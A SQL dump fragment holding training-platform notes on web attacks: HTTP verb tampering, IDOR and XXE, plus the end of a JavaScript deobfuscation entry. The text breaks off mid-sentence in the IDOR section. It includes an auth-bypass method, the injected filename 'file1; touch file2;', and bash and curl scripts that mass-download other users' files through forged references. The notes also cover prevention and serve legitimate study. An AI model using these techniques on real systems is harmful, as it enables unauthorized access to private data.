This is the module''s own wrap-up of the full workflow you learned. You started by uncovering the HTML source of the page and locating its JavaScript. Then you learned the different ways JavaScript can be obfuscated — minifying, packing, and advanced/symbol-only obfuscation. After that you learned to **beautify and deobfuscate** minified and packed code back into something readable. Next you **analysed** the recovered code and understood its one real function.

From there you learned enough about **HTTP requests** to **replicate** that function yourself with cURL, sending the same hidden `POST` the script would have sent. Finally you learned to **encode and decode** strings — Base64, Hex, and ROT13 — so you could read the encoded response the server returned.

**End-to-end skill you now have:**
1. Find the JavaScript in a page''s source.
2. Recognise obfuscation (packing''s `(p,a,c,k,e,d)`, Base64 string arrays, JSFuck-style symbols).
3. Beautify → deobfuscate (Dev Tools, Prettier/Beautifier, UnPacker) → reverse engineer if custom.
4. Analyse the recovered function line by line.
5. Replicate its HTTP request with cURL (`-s`, `-X POST`, `-d`).
6. Decode encoded output (`base64 -d`, `xxd -p -r`, `tr` for ROT13).

> *Note: Module Section 10 (the questions/skills-assessment section) was not included in the provided material, so these notes jump from the content sections straight to the Section 11 Summary. Add your own assessment answers here once you complete that section.*

---

## Appendix — Quick Command Cheat-Sheet

| Task | Command |
| --- | --- |
| View page HTML (browser) | `CTRL + U` |
| Open Firefox debugger | `CTRL + SHIFT + Z` → click script → `{ }` to pretty-print |
| Fetch a page | `curl http://SERVER_IP:PORT/` |
| Fetch quietly | `curl -s http://SERVER_IP:PORT/` |
| Send POST | `curl -s http://SERVER_IP:PORT/ -X POST` |
| Send POST with data | `curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"` |
| Base64 encode | `echo TEXT | base64` |
| Base64 decode | `echo B64 | base64 -d` |
| Hex encode | `echo TEXT | xxd -p` |
| Hex decode | `echo HEX | xxd -p -r` |
| ROT13 encode/decode | `echo TEXT | tr ''A-Za-z'' ''N-ZA-Mn-za-m''` |
| ASCII table | `man ascii` |

**Online tools referenced in the module:**
- Run JS: `https://jsconsole.com`
- Minify: `https://javascript-minifier.com`
- Obfuscate (basic/pack): `http://beautifytools.com/javascript-obfuscator.php`
- Obfuscate (advanced): `https://obfuscator.io`
- Beautify: `https://prettier.io/playground/` · `https://beautifier.io/`
- Unpack/deobfuscate: `https://matthewfl.com/unPacker.html`
- Identify encoding: *Cipher Identifier*

---

*End of Notes — JavaScript Deobfuscation (Sections 1–9 + Summary). Nothing from the provided content was skipped or renamed; Section 10 was not provided.*', NULL, 'PUBLISHED', 'PUBLIC', 27, 'cmvfonfhr00ayida0a37aijsy', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792500433.572), to_timestamp(1792500433.572), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvgojdyd0027idhw0zjzr31x', 'Web Attacks: HTTP Verb Tampering, IDOR & XXE Injection', 'web-attacks-http-verb-tampering-idor-xxe-injection-3554', 'Detect, exploit, and prevent three core web attacks — HTTP Verb Tampering, IDOR, and XXE Injection — with step-by-step commands and a full HTB challenge chain writeup ending in a captured flag.', '# Web Attacks — Structured Notes

---

## Table of Contents

**1. Introduction to Web Attacks**

- 1.1 Web Attacks Covered in This Module

---

**2. HTTP Verb Tampering**

- 2.1 Intro to HTTP Verb Tampering
  - 2.1.1 HTTP Verbs — Overview Table
- 2.2 Insecure Configurations
- 2.3 Insecure Coding
  - 2.3.1 How the Vulnerability Occurs
  - 2.3.2 Breaking Down the Problem
  - 2.3.3 How an Attacker Exploits This
- 2.4 Bypassing Basic Authentication
  - 2.4.1 Identify
  - 2.4.2 Exploit
  - 2.4.3 Step-by-Step: How to Bypass Basic Authentication
- 2.5 Bypassing Security Filters
  - 2.5.1 Identify
  - 2.5.2 Exploit
  - 2.5.3 Step-by-Step: How to Bypass a Security Filter
- 2.6 Verb Tampering Prevention
  - 2.6.1 Fixing Insecure Server Configurations
  - 2.6.2 Fixing Insecure Coding

---

**3. Insecure Direct Object References (IDOR)**

- 3.1 Intro to IDOR
  - 3.1.1 Impact of IDOR Vulnerabilities
- 3.2 Identifying IDORs
  - 3.2.1 URL Parameters & APIs
  - 3.2.2 AJAX Calls in JavaScript
  - 3.2.3 Understanding Hashed or Encoded References
  - 3.2.4 Comparing User Roles
- 3.3 Mass IDOR Enumeration
  - 3.3.1 Insecure Parameters
  - 3.3.2 Identifying the IDOR
  - 3.3.3 Step-by-Step: Mass Enumeration with Bash
- 3.4 Bypassing Encoded References
  - 3.4.1 Identify
  - 3.4.2 Function Disclosure
  - 3.4.3 Verify the Hash
  - 3.4.4 Mass Enumeration
- 3.5 IDOR in Insecure APIs
  - 3.5.1 Identifying Insecure APIs
  - 3.5.2 Exploiting Insecure APIs
- 3.6 Chaining IDOR Vulnerabilities
  - 3.6.1 Information Disclosure
  - 3.6.2 Modifying Other Users'' Details
  - 3.6.3 Chaining Two IDOR Vulnerabilities
- 3.7 IDOR Prevention
  - 3.7.1 Object-Level Access Control (RBAC)
  - 3.7.2 Object Referencing

---

**4. XML External Entity (XXE) Injection**

- 4.1 Intro to XXE
  - 4.1.1 XML Basics
  - 4.1.2 XML DTD (Document Type Definition)
  - 4.1.3 XML Entities
- 4.2 Local File Disclosure
  - 4.2.1 Identifying
  - 4.2.2 Step-by-Step: Exploiting XXE to Read Local Files
  - 4.2.3 Remote Code Execution via XXE
  - 4.2.4 Other XXE Attacks
- 4.3 Advanced File Disclosure
  - 4.3.1 Advanced Exfiltration with CDATA
  - 4.3.2 Error-Based XXE
- 4.4 Blind Data Exfiltration
  - 4.4.1 Out-of-Band Data Exfiltration
  - 4.4.2 Automated OOB Exfiltration with XXEinjector
- 4.5 XXE Prevention
  - 4.5.1 Avoiding Outdated Components
  - 4.5.2 Using Safe XML Configurations
  - 4.5.3 Additional Recommendations

---

**5. HTB Web Challenge Writeup**

- 5.1 Overview
- 5.2 Step 1: User Enumeration via IDOR
- 5.3 Step 2: Token IDOR — Steal Admin''s Reset Token
- 5.4 Step 3: HTTP Verb Tampering — Bypass Auth on reset.php
  - 5.4.1 Discovery — Reading settings.php Source Code
  - 5.4.2 How the Reset Flow Works
  - 5.4.3 The Problem
  - 5.4.4 The Bypass
- 5.5 Step 4: Login as Administrator
- 5.6 Step 5: XXE Injection on /addEvent.php
  - 5.6.1 Discovery
  - 5.6.2 Payload
- 5.7 Step 6: Decode the Flag
- 5.8 Flag
- 5.9 Vulnerability Summary
- 5.10 Key Takeaways

---

## Introduction to Web Attacks

Web applications are used by almost every business today, making their security extremely important. As web apps grow more complex, attackers also develop more advanced techniques to exploit them. This creates a large attack surface, making web attacks the most common type of attack against companies. Protecting web applications has become a top priority for any IT or security team.

Attacking external-facing web applications can lead to compromise of a company''s internal network, resulting in stolen data, disrupted services, or serious financial damage. Even companies without public-facing web apps usually have internal ones or API endpoints — both of which are just as vulnerable and can be exploited for the same goals.

### Web Attacks Covered in This Module

This module focuses on three major web attack types that are commonly found across web applications:

- **HTTP Verb Tampering** — abuses servers that accept extra HTTP methods (like HEAD or PUT) to bypass authentication or security filters.
- **Insecure Direct Object References (IDOR)** — abuses missing back-end access control to read or change other users'' data by changing an ID or reference.
- **XML External Entity (XXE) Injection** — abuses unsafe XML parsing to read local files, steal credentials, or reach remote code execution.

For each attack, the module explains how to **detect** it, how to **exploit** it, and how to **prevent** it.

---

## Section 1: HTTP Verb Tampering

---

### Intro to HTTP Verb Tampering

The HTTP protocol works by accepting different HTTP methods (also called verbs) at the start of each request. Web applications are often configured to accept only specific methods like GET and POST, and they perform different actions depending on which method is used.

If a web application or server is not configured to restrict which HTTP methods it accepts, an attacker can send unusual or unexpected HTTP methods. This can lead to bypassing security controls, accessing restricted functions, or triggering server errors. The vulnerability arises from a mismatch between what the server accepts and what the application is coded to handle.

HTTP supports **9 verbs** in total. Most developers only plan for GET and POST, but a client can send any of the others and watch how the server reacts. If both the server and the app only expect GET/POST, an extra method usually just shows an error page (a minor issue). The real danger appears when the server accepts extra methods **and** the app does not handle them safely — that gap is what verb tampering exploits.

#### HTTP Verbs — Overview Table

| Verb    | Description                                                 |
| ------- | ----------------------------------------------------------- |
| GET     | Retrieves data from the server                              |
| POST    | Sends data to the server (e.g. form submissions)            |
| HEAD    | Same as GET but only returns headers, not the response body |
| PUT     | Writes/uploads data to a specified location on the server   |
| DELETE  | Deletes a resource at the specified location                |
| OPTIONS | Lists the HTTP methods accepted by the server               |
| PATCH   | Applies partial modifications to a resource                 |

Some of these verbs like PUT and DELETE can be very dangerous if the server allows them without proper restrictions, as they can be used to write or delete files directly on the server. What makes verb tampering so common and critical is that it comes from a **misconfiguration** in either the server or the app — either one alone is enough to create the bug.

---

### Insecure Configurations

The first type of HTTP Verb Tampering vulnerability comes from **insecure web server configurations**. When a server''s authentication rules only apply to certain HTTP methods (like GET and POST), other methods like HEAD or OPTIONS may still be accessible without any authentication at all.

For example, an Apache server might have a config like this:

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

This config only protects GET and POST requests. An attacker can still send a HEAD request and completely bypass the authentication check. This is a classic configuration mistake that leads to **authentication bypass**, allowing access to restricted web pages or admin panels without valid credentials. The lesson is that naming specific verbs in an auth rule is dangerous, because every verb you forget to list stays unprotected.

---

### Insecure Coding

The second type of HTTP Verb Tampering vulnerability comes from **mistakes in the application''s source code**. Developers sometimes write security filters that only check one HTTP method (e.g. GET), while the actual function uses a broader parameter that covers multiple methods. This inconsistency is what attackers exploit — the filter is bypassed simply by switching the HTTP method, even though the underlying vulnerable function still runs.

#### How the Vulnerability Occurs

Suppose a web page was found to be vulnerable to **SQL Injection**, and a developer tried to fix it by adding an input sanitization filter. The filter looks like this:

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like ''%" . $_REQUEST["code"] . "%''";
    ...SNIP...
}
```

At first glance this looks like a fix — the `preg_match` function checks the input against a pattern that only allows letters and spaces. But there is a critical mistake hidden here.

#### Breaking Down the Problem

| Part of Code                | What It Does                                | The Problem                              |
| --------------------------- | ------------------------------------------- | ---------------------------------------- |
| `$_GET["code"]`             | Reads the input from the GET parameter      | Only GET is being checked by the filter  |
| `preg_match($pattern, ...)` | Validates input — blocks special characters | Only runs on GET, not POST               |
| `$_REQUEST["code"]`         | Used in the actual SQL query                | Accepts **both** GET and POST parameters |

The filter checks `$_GET["code"]` — meaning it only validates the GET version of the parameter. But the SQL query uses `$_REQUEST["code"]`, which in PHP covers **both GET and POST** parameters. This creates a dangerous inconsistency.

#### How an Attacker Exploits This

An attacker can switch the request method from GET to POST and send their malicious SQL payload in the POST body instead:

- The `$_GET["code"]` parameter will be **empty** — no special characters, so the filter passes.
- The `$_REQUEST["code"]` parameter will pick up the **POST value** — which contains the malicious payload.
- The SQL query executes with the injected input, making the application **vulnerable to SQL Injection** despite having a filter in place.

This is the core issue: the filter protects one method, but the function reads from all methods. Switching methods bypasses the protection entirely without touching the actual vulnerability. Of the two verb-tampering types, this coding mistake is far more common, because secure configuration is well documented while coding slips happen easily and often survive to production.

---

### Bypassing Basic Authentication

Exploiting HTTP Verb Tampering is usually a straightforward process. The idea is to try different HTTP methods and observe how the server responds to each one. Automated tools can detect configuration-based Verb Tampering easily, but code-based Verb Tampering usually requires manual testing to identify and exploit properly.

This type of vulnerability is mainly caused by **Insecure Web Server Configurations**, and exploiting it can allow us to bypass the HTTP Basic Authentication prompt on certain pages entirely — without needing any valid credentials.

#### Identify

When we open the target web application, we see a basic **File Manager** that lets us add new files by typing their names and pressing Enter. Everything looks normal at first.

However, when we click the red **Reset** button to delete all files, the application immediately shows an **HTTP Basic Auth prompt** — meaning this function is restricted to authenticated users only. Since we have no credentials, submitting without them gives us a `401 Unauthorized` page.

To plan our attack, we need to figure out exactly what is restricted. We look at the URL the Reset button points to: `/admin/reset.php`. This could mean either the full `/admin/` directory is protected, or just that one file. We test by visiting `/admin/` directly — and we get the same login prompt. This confirms that the **entire `/admin/` directory is locked behind authentication**.

#### Exploit

Now that we know what is restricted, we move to exploitation. We need to identify the HTTP request method the application is using, then try alternative methods that the server may not have covered in its authentication rules.

#### Step-by-Step: How to Bypass Basic Authentication

**Step 1 — Identify the restricted page**

Try accessing a restricted page (e.g. `/admin/reset.php`) and see if you get a login prompt or a `401 Unauthorized` error. This tells you which pages require authentication.

**Step 2 — Check the request method**

Intercept the request using Burp Suite and check whether it uses GET or POST. This is the method currently being protected by authentication. In this exercise the Reset button sends a **GET** request. Trying to change it to **POST** (Burp → right-click → **Change Request Method**) still returns the login prompt and a 401, which means the server protects **both** GET and POST.

**Step 3 — Check what methods the server accepts**

Use `curl` to send an OPTIONS request and see which methods the server allows:

```shellsession
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

Command explained step by step:
- `curl` is a command-line tool that sends HTTP requests.
- `-i` **includes the response headers** in the output, so we can read the `Allow:` line.
- `-X OPTIONS` sets the request **method to OPTIONS**, which asks the server to list the verbs it accepts.
- `http://SERVER_IP:PORT/` is the target address.

Example response:

```
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
```

This tells you that the server also accepts **HEAD** requests (which is the default for many web servers).

**Step 4 — Send a HEAD request**

Change the request method to HEAD (using Burp''s "Change Request Method") and forward it. Since authentication is only enforced on GET and POST, the HEAD request will pass through without prompting for a login. HEAD behaves like GET but returns **no response body**, so we expect empty output.

**Step 5 — Confirm the bypass**

Even though a HEAD request returns no response body, the server-side function still executes. For example, a Reset function would still run and delete all files — confirming that authentication was bypassed successfully. Going back to the File Manager shows all files are gone, with **no admin access and no credentials**. Try other methods too, to see which ones also bypass the prompt.

---

### Bypassing Security Filters

This is the second — and more common — type of HTTP Verb Tampering. It occurs when a web application''s **security filter only checks one HTTP method**, leaving other methods unprotected.

This vulnerability is caused by **Insecure Coding** errors made during development, where the developer did not cover all HTTP methods in their security filter logic. This is very commonly found in filters that detect injection attacks — if the filter only checks POST parameters (e.g. `$_POST[''parameter'']`), an attacker can simply switch the request to GET and bypass the filter entirely.

#### Identify

In the **File Manager** web application, if we try to create a file with special characters in its name (e.g. `test;`), the application blocks the request and shows an error message indicating that a malicious request was detected. This tells us that a **back-end security filter** is in place that identifies injection attempts and blocks them.

No matter what special characters or patterns we try, the filter keeps blocking us. The application appears secure against injection. However, this filter may only be checking one HTTP method — which is our opening for a Verb Tampering attack.

#### Exploit

To try and exploit this vulnerability, we intercept the request in **Burp Suite** and use **"Change Request Method"** to switch it to a different method (e.g. from POST to GET).

This time, the `Malicious Request Denied!` message does not appear — our file is created successfully. This confirms the filter is not covering all HTTP methods.

To fully confirm the bypass and prove Command Injection is possible, we inject a command as the filename: `file1; touch file2;`. We change the request method again and send it. If **both `file1` and `file2` are created** on the server, we have successfully achieved Command Injection through the Verb Tampering bypass.

Here `file1;` ends the first command and `touch file2;` is the injected command that creates a second file. Seeing both files appear proves the injected command ran. This also proves that without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection — but the filter bypass opened the door to it completely.

#### Step-by-Step: How to Bypass a Security Filter

**Step 1 — Identify the filter**

Try submitting a request with special characters (e.g. `test;`). If the server blocks it with a message like `Malicious Request Denied!`, a security filter is in place.

**Step 2 — Change the request method**

Intercept the request in Burp Suite and use "Change Request Method" to switch from POST to GET (or vice versa). Send the modified request.

**Step 3 — Observe the result**

If the filter only checks POST parameters, a GET request with the same payload may pass through without triggering the filter. This confirms a Verb Tampering vulnerability.

**Step 4 — Exploit the underlying vulnerability**

Now try injecting a command using the bypassed method. For example, use the filename `file1; touch file2;` as a GET parameter. If both files are created on the server, you''ve confirmed **Command Injection** through Verb Tampering.

---

### Verb Tampering Prevention

Preventing HTTP Verb Tampering requires fixing both server configurations and application code. The key idea is to make sure security rules apply to **all HTTP methods**, not just a specific one or two.

#### Fixing Insecure Server Configurations

Vulnerable configurations restrict authentication only to specific methods. Here are examples across different web servers and how to fix them:

**Apache — vulnerable config:**

```xml
<Limit GET>
    Require valid-user
</Limit>
```

**Fix:** Use `LimitExcept` instead, which covers all methods *except* the listed ones:

```xml
<LimitExcept GET POST>
    Require valid-user
</LimitExcept>
```

Note: `LimitExcept` flips the logic — it applies the rule to every verb that is **not** named, so forgotten verbs like HEAD or PUT are covered automatically instead of left open.

**Tomcat (`web.xml`) — vulnerable:**

```xml
<http-method>GET</http-method>
```

**Fix:** Use `http-method-omission` to cover all other methods. For example, `<http-method-omission>GET</http-method-omission>` applies the constraint to every method except GET, closing the gap.

**ASP.NET (`web.config`) — vulnerable:**

```xml
<allow verbs="GET" roles="admin">
<deny verbs="GET" users="*">
```

**Fix:** Use `add/remove` directives that cover all verbs, not just GET.

As a general rule, **always disable or deny HEAD requests** unless your application specifically requires them, since they are the most commonly abused method in bypass attacks.

#### Fixing Insecure Coding

Insecure code uses inconsistent HTTP parameter variables across functions. The fix is to **use the same parameter type everywhere** — especially in security-critical functions:

| Language | Secure Function to Use          |
| -------- | ------------------------------- |
| PHP      | `$_REQUEST[''param'']`            |
| Java     | `request.getParameter(''param'')` |
| C#       | `Request[''param'']`              |

By ensuring that both the security filter and the actual function use the same HTTP parameter scope, you eliminate the inconsistency that attackers exploit. The goal is that if a parameter is checked, it is checked no matter which HTTP method delivered it.

---

## Section 2: Insecure Direct Object References (IDOR)

---

### Intro to IDOR

IDOR (Insecure Direct Object References) is one of the most common web vulnerabilities. It happens when a web application exposes a direct reference to an internal object — like a file ID or database record — and the user can manipulate that reference to access other objects they shouldn''t have access to.

The core cause of IDOR is a **weak or missing access control system on the back-end**. When the back-end doesn''t verify whether a user is actually allowed to access a specific resource, an attacker can simply guess or change the ID to access someone else''s data. These vulnerabilities are hard to detect automatically, which is why they often make it into production even in large applications like Facebook and Instagram.

It is worth stressing that exposing a direct reference is **not** a vulnerability by itself. The real problem is the missing access control behind it. Many apps only hide resources on the front-end (by not showing the links), but if the back-end never checks permissions, editing the HTTP request directly reveals that every user can reach everyone''s data.

#### Impact of IDOR Vulnerabilities

IDOR vulnerabilities can have serious consequences depending on what kind of objects are exposed:

- **IDOR Information Disclosure** — Accessing private files, personal records, or financial data of other users.
- **IDOR Insecure Function Calls** — Calling admin-only APIs or functions with a regular user account to perform unauthorized actions like changing passwords or granting roles.
- **Account Takeover** — By modifying another user''s email via IDOR and then triggering a password reset, an attacker can fully take over an account.
- **Privilege Escalation** — Changing your own role from `employee` to `admin` if the back-end doesn''t validate the role server-side.

---

### Identifying IDORs

Finding IDOR vulnerabilities requires carefully examining how the application references objects and whether the back-end enforces proper access checks on those references.

#### URL Parameters & APIs

The first place to look is URL parameters and API calls. When you receive a file or data, check the URL for patterns like `?uid=1` or `?filename=file_1.pdf`. These are direct object references. Try incrementing the value (`?uid=2`) to see if you can access another user''s data. You can also use fuzzing tools to try thousands of values automatically. These references may also hide in other places such as cookies or HTTP headers, so check the full request, not just the URL.

#### AJAX Calls in JavaScript

Web applications built with JavaScript frameworks (React, Angular, Vue) sometimes include all function calls in the front-end code — even admin-only ones. If you inspect the JavaScript source, you may find AJAX calls that reference APIs with direct object IDs. These can be tested for IDOR even if they''re never triggered during normal use.

For example, if we do not have an admin account, only user-level functions would be used in the app, while admin functions would be disabled or hidden. However, those admin functions may still exist in the front-end JavaScript code. If we find AJAX calls in the source that reference specific endpoints or APIs with direct object references, we can test them for IDOR — even if the app never calls them for our role.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

This function may never run for a normal user, but if you find it in the source, you can call it manually to test for IDOR. This is not limited to admin functions — any hidden or unused function calls that don''t appear in normal HTTP traffic could expose IDOR vulnerabilities. We can do the same with back-end code if we have access to it (e.g. in open-source web applications).

#### Understanding Hashed or Encoded References

Some applications encode references using Base64 or hash them with MD5 instead of using plain sequential numbers. Even if the reference looks complex or random, it may still be exploitable if there is no proper access control on the back-end.

**Base64 Encoded References**

If you see a URL parameter like `?filename=ZmlsZV8xMjMucGRm`, the character set is a strong hint that it''s Base64-encoded. Decode it to get the original value (e.g. `file_123.pdf`), change it to another value (e.g. `file_124.pdf`), re-encode it, and use the new encoded value in the request. If you get back data, the app is vulnerable to IDOR. You can decode and encode quickly on the command line:

```shellsession
echo -n "ZmlsZV8xMjMucGRm" | base64 -d      # decode  → file_123.pdf
echo -n "file_124.pdf" | base64             # re-encode a new value
```

- `echo -n` prints the text with **no trailing newline** (a newline would corrupt the decode/encode).
- `base64 -d` **decodes** Base64; `base64` with no flag **encodes**.

**Hashed References**

A reference like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c` may look secure at first since it''s not in plain text. However, if the hashing is done on the front-end (in JavaScript), the logic is fully visible to anyone who reads the source code. For example:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5(''file_1.pdf'').toString()},
    success:function(result){
        //
    }
});
```

Here the app is MD5-hashing the filename directly. Since we can see exactly what''s being hashed, we can calculate the hash for any other filename ourselves and use it to request files that don''t belong to us. If the hash algorithm is not visible in the source, use a hash identifier tool to figure out the algorithm, then hash filenames manually to match and replicate the pattern.

#### Comparing User Roles

For more advanced IDOR attacks, register multiple user accounts and compare their HTTP requests and object references side by side. This helps you understand how the application calculates its URL parameters and unique identifiers, and lets you replicate those calculations for other users to access their data.

For example, suppose User 1 can view their salary by making an API call that returns:

```json
{
  "attributes": {
    "type": "salary",
    "url": "/services/data/salaries/users/1"
  },
  "Id": "1",
  "Name": "User1"
}
```

User 2 may not have access to the same API parameters and normally cannot replicate this call. However, with the details captured from User 1, you can log in as User 2 and send the exact same API request. If the back-end only checks that a valid session exists — but does not verify that the session belongs to the user whose data is being requested — the API will return User 1''s salary data to User 2. This is a clear IDOR vulnerability caused by a missing back-end access control check.

---

### Mass IDOR Enumeration

Once you confirm an IDOR vulnerability, you can automate the process to extract data from many users at once instead of doing it manually one by one. Exploiting IDOR vulnerabilities can be easy in some cases but very challenging in others. For basic attacks, simple techniques are enough. For advanced attacks, you need to understand how the app calculates object references and how its access control system works before you can enumerate at scale.

#### Insecure Parameters

Let''s walk through a real example using an **Employee Manager** web application. When logged in as `uid=1` and navigating to the Documents page, the URL becomes:

```
/documents.php?uid=1
```

The page shows documents belonging to the current user, with file names like:

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

The file names follow a predictable pattern — **user UID + month/year**. This is the most basic type called **Static File IDOR**. You could try fuzzing file names directly, but that only works if you know the prefix (e.g. `Invoice` or `Report`) and would miss other file types. A better approach is to manipulate the `uid` parameter in the URL directly.

#### Identifying the IDOR

Change the URL parameter from `?uid=1` to `?uid=2`. The page may look identical at first glance — same layout, same section headings. However, always check the actual file links in the page source, not just the page appearance. The linked files will be different:

```
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

These are another employee''s files — confirming the IDOR vulnerability. The app is using the `uid` GET parameter as a direct reference to the database records, with no back-end access control checking whether you are allowed to view that user''s data. Another common variant uses a filter parameter like `uid_filter=1` — which can also be changed to another user''s ID, or removed entirely to show all users'' documents at once.

#### Step-by-Step: Mass Enumeration with Bash

Manually changing the `uid` one by one is not practical in a real environment with hundreds or thousands of employees. Instead, we automate it with a bash script.

**Step 1 — View the HTML source of the documents page**

Press `CTRL+SHIFT+C` in Firefox to open the element inspector, then click any document link to view its HTML. You will see links structured like this:

```html
<li class=''pure-tree_link''><a href=''/documents/Invoice_3_06_2020.pdf'' target=''_blank''>Invoice</a></li>
<li class=''pure-tree_link''><a href=''/documents/Report_3_01_2020.pdf'' target=''_blank''>Report</a></li>
```

**Step 2 — Use curl and grep to extract file links**

First you can grep by a unique string that every link shares (`<li class=''pure-tree_link''>`):

```shellsession
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class=''pure-tree_link''>"
```

A cleaner approach uses a Regex pattern that matches everything between `/documents` and `.pdf`:

```shellsession
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?.pdf"
```

Command explained:
- `curl -s` fetches the page **silently** (`-s` hides the progress bar and errors).
- `|` pipes curl''s output into `grep`.
- `-o` makes grep print **only the matched part**, not the whole line.
- `-P` enables **Perl-style regex**, so `.*?` works as a shortest (non-greedy) match.
- `"/documents.*?.pdf"` matches the shortest text starting at `/documents` and ending at `.pdf` — i.e. the file path.

Output:

```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

**Step 3 — Write a loop to enumerate all users and download every file**

Use a `for` loop to go through UIDs 1–10, extract all document links for each user, and download them with `wget`:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

Script explained step by step:
- `url="http://SERVER_IP:PORT"` stores the target base address in a variable.
- `for i in {1..10}` loops the uid value `i` from 1 to 10 (ten employees).
- The inner `for link in $(...)` runs the curl + grep command and loops over each PDF path it finds.
- `wget -q $url/$link` downloads each file; `-q` means **quiet** (no output).

When you run this script, it downloads all documents for every employee from UID 1 to 10, successfully exploiting the IDOR vulnerability to mass enumerate and collect data across all accounts. You can also achieve the same result using tools like **Burp Intruder** or **ZAP Fuzzer** instead of a bash script.

---

### Bypassing Encoded References

In the previous section, the IDOR used employee UIDs in plain text — easy to enumerate. Some applications go further and **hash or encode** their object references to make enumeration harder. However, if the hashing logic runs on the front-end (in JavaScript), it is still fully visible to attackers and can be reversed and replicated.

#### Identify

Going back to the **Employee Manager** web application, we test the **Contracts** section. When we click on `Employment_contract.pdf` to download it, Burp Suite intercepts a POST request to `/download.php` with this data:

```
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Using a `download.php` script (instead of linking files directly) is a common practice, because directly linked files can be exploited by other web attacks. This value looks like an **MD5 hash**. Since hashes are one-way functions, we cannot simply decode them. We need to figure out what value is being hashed. We can start by trying common values like `uid`, `username`, or `filename` and check if their MD5 hashes match:

```shellsession
echo -n 1 | md5sum
# c4ca4238a0b923820dcc509a6f75849b
```

Command explained:
- `echo -n 1` prints `1` with **no trailing newline** (`-n`), so we hash exactly `1`.
- `| md5sum` pipes that into `md5sum`, which prints the MD5 hash.

This doesn''t match. Trying other simple values also fails. At this point, the hash could be for a unique or combined value — which would make it a **Secure Direct Object Reference**. However, there is one fatal flaw: the hash is being calculated on the **front-end**.

#### Function Disclosure

Most modern web applications use JavaScript frameworks like Angular, React, or Vue.js. A common developer mistake is performing sensitive operations — like hash generation — in the front-end JavaScript, which exposes the full logic to anyone who reads the source.

Looking at the page source, we find the link is calling a JavaScript function:

```
javascript:downloadContract(''1'')
```

Inspecting the `downloadContract()` function in the source code reveals:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Now we can see exactly what is happening:

- `btoa(uid)` → Base64-encodes the UID (`btoa` is JavaScript''s built-in base64 encoder)
- `CryptoJS.MD5(...)` → MD5-hashes the Base64 result
- The final hash is sent as the `contract` POST parameter

The function is called with `downloadContract(''1'')`, so for UID 1, the value being hashed is the Base64 encoding of `1`.

#### Verify the Hash

We can confirm this by replicating the same steps manually:

```shellsession
echo -n 1 | base64 -w 0 | md5sum
# cdd96d3cc73d1dbdaffa03cc6cd7339b
```

Command explained:
- `echo -n 1` outputs `1` with no newline.
- `base64 -w 0` base64-encodes it; `-w 0` means **no line wrapping**, so no newline is added.
- `md5sum` hashes the result.

> **Tip:** Use `-n` with `echo` to avoid adding a newline, and `-w 0` with `base64` to prevent line wrapping. Both would change the MD5 output if included.

The hash matches exactly — we have successfully **reversed the front-end hashing technique** and turned what appeared to be a secure reference into an exploitable IDOR.

#### Mass Enumeration

Now that we know the formula (`Base64(uid)` → `MD5`), we can generate hashes for any user and use them to download their contracts.

**Step 1 — Generate hashes for all UIDs**

Use a loop to calculate the hash for employees 1 through 10 and strip the trailing ` -` from `md5sum` output using `tr -d`:

```shellsession
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d '' -''; done
```

Command explained:
- `for i in {1..10}` loops `i` from 1 to 10.
- For each `i`, `echo -n $i | base64 -w 0 | md5sum` builds the same base64 + MD5 value the app uses.
- `tr -d '' -''` **deletes** the trailing space and dash that `md5sum` prints, leaving a clean hash.

Output:

```
cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

**Step 2 — Send POST requests for each hash to download contracts**

Write a bash script that generates each hash and sends a POST request to `/download.php` with `curl`:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d '' -''); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

Command explained:
- The outer loop runs uid `i` from 1 to 10; the inner loop computes the clean `hash` for that uid.
- `curl -sOJ -X POST -d "contract=$hash" .../download.php` downloads each contract:
